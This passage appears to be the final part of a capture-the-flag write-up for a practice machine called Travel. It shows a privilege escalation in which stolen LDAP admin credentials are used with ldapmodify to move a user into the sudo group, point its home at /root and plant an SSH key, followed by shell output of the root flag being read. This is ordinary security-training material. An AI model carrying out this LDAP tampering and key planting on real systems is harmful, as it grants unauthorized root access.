  Memory usage:                     11%
  Swap usage:                       0%
  Processes:                        206
  Users logged in:                  3
  IPv4 address for br-836575a2ebbb: 172.20.0.1
  IPv4 address for br-8ec6dcae5ba1: 172.30.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.10.189

Last login: Fri May 29 20:34:04 2020 from 10.10.14.39
trvl-admin@travel:~$ pwd
/home@TRAVEL/jane
```

Success! The home directory looks different than usual. Let's add in a public key to to the `/home/trvl-admin/.ssh/authorized_keys` file so we can easily get back in.

## trvl-admin enum

After running some enum, and looking at what `trvl-admin` has access to that `lynik-admin` doesn't, there's not an obvious route to root. The most obvious route
seems to be using `sudo`, and there's a `.sudo_as_admin_as_successful` file in the `trvl-admin` home directory. However, we don't have the password. We do,
however, have the password for `lynik-admin`. What if we could login via ldap as `lynik-admin`, but with a `gidNumber` for the `sudo` group. Let's try it.

## Owning Root

Let's modify the numbers in our script and then run it:

```sh
#!/bin/sh

ssh_public_key="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCHtkd8s52uvd5zuCIgf0e8nm38SLNIKLd4l/v4Xzi6ONcGQbsFE15J54fEuNdZZOQV4CQZ0a20tDz7cPx/S+vItI/dxcxOl0UWKHn6ut6gH2Tj0P4hutXEBkqF0BsPpQhzD9ZXb3CtRTWYnjycmPLs+VKvSjICH0ZHTrgYHeArs2XQ18ZHCBIUlO1a9wkQjDbD0oyPLjiqRd856ktOQ7RX5wyHeY3eXDm539tqdPNJvWzkCzF8ncLDaKBRDwua+OtZS/1xA6m4WLiEYYBVtS+S9xKjIbbU0HMONWykMvFhb8jx8ULb5KKLUbW0wx9FJsSHbgUSwHRegh8RmqRCOQaVZH8fo6bwsw2YKtKjDzTL8E4gqv3opbItxQ4FEUsvj3kW6Bcxmoo4y+yrHJf+YJsbZUn0Q5UVV+XVHAnOOuUnmv6LAOisxKpS7/F/m3oC6m95Jx45TFCKx+c9Avo7+S+llbdegaUAF31Hyspy70tjV75UXfF2Q9IDrCERAxQAQU="

echo "dn: uid=jane,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
changetype: modify
replace: uidNumber
uidNumber: 1001
-
replace: gidNumber
gidNumber: 27
-
replace: homeDirectory
homeDirectory: /root
-
add: objectClass
objectClass: ldapPublicKey" | ldapmodify -D cn=lynik-admin,dc=travel,dc=htb -w Theroadlesstraveled -x

echo "dn: uid=jane,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
changetype: modify
replace: sshPublicKey
sshPublicKey: ${ssh_public_key}" | ldapmodify -D cn=lynik-admin,dc=travel,dc=htb -w Theroadlesstraveled -x
```

And now let's SSH in as `jane`.

```shell-session
╭─zoey@virtual-parrot ~
╰─$ ssh jane@travel.htb
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-26-generic x86_64)

  System information as of Sat 30 May 2020 04:17:20 AM UTC

  System load:                      0.0
  Usage of /:                       46.4% of 15.68GB
  Memory usage:                     16%
  Swap usage:                       0%
  Processes:                        210
  Users logged in:                  2
  IPv4 address for br-836575a2ebbb: 172.20.0.1
  IPv4 address for br-8ec6dcae5ba1: 172.30.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.10.189


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Sat May 30 04:15:34 2020 from 10.10.14.39
Could not chdir to home directory /home@TRAVEL/jane: Permission denied
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

-bash: /home@TRAVEL/jane/.bash_profile: Permission denied
lynik-admin@travel:/$ id
uid=1001(lynik-admin) gid=27(sudo) groups=27(sudo)
lynik-admin@travel:/$ sudo cat /root/root.txt
[sudo] password for lynik-admin:
27361***********************599f
```

Success!
